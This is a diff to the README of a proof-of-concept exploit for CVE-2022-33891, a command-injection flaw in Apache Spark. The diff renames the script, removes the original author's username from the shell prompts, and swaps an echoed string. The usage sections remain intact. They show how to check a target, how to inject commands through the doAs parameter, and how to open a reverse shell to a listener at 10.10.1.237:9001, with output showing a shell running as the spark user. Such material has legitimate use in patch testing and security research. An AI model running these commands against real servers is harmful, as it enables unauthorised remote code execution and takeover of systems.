@@ -33,7 +33,7 @@ You need a vulnerable version of Spark that has a single config option changed.
 ## Usage
 ```
 ┌──(kali㉿kali)-[~/Desktop]
-└─$ python3 poc.py -h
+└─$ python3 exploit.py -h
 usage: poc.py [-h] -u URL -p PORT [--revshell]
               [-lh LISTENINGHOST] [-lp LISTENINGPORT]
               [--check] [--verbose]
@@ -59,7 +59,7 @@ optional arguments:
 
 Check to see if the target is vulnerable:
 ```
-husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --check --verbose
+:~/Desktop/cve-2022-33891$ python3 exploit.py -u http://localhost -p 8080 --check --verbose
 [*] Attempting to connect to site...
 [*] URL request: http://localhost:8080/?doAs='testing'
 [*] Response status code: 403
@@ -78,7 +78,7 @@ husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 80
 
 Issue commands in a command prompt loop:
 ```
-husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --verbose
+:~/Desktop/cve-2022-33891$ python3 exploit.py -u http://localhost -p 8080 --verbose
 [*] "Interactive" mode!
 [!] Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.
 [cve-2022-33891> sleep 5
@@ -93,7 +93,7 @@ husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 80
 
 Execute a reverse shell:
 ```
-husky@dev-kde:~/Desktop/cve-2022-33891$ python3 poc.py -u http://localhost -p 8080 --revshell -lh 10.10.1.237 -lp 9001 --verbose
+:~/Desktop/cve-2022-33891$ python3 exploit.py -u http://localhost -p 8080 --revshell -lh 10.10.1.237 -lp 9001 --verbose
 [*] Reverse shell mode.
 [*] Set up your listener by entering the following:
 nc -nvlp 9001
@@ -105,14 +105,14 @@ nc -nvlp 9001
 
 ...[in the other terminal]...
 
-husky@dev-kde:~/Desktop/cve-2022-33891$ nc -nvlp 9001
+:~/Desktop/cve-2022-33891$ nc -nvlp 9001
 Listening on 0.0.0.0 9001
 Connection received on 172.19.0.2 52136
 sh: 0: can't access tty; job control turned off
 $ whoami
 spark
-$ echo "hackerman"
-hackerman
+$ echo "devengpk"
+devengpk
 $ 
 ```
 
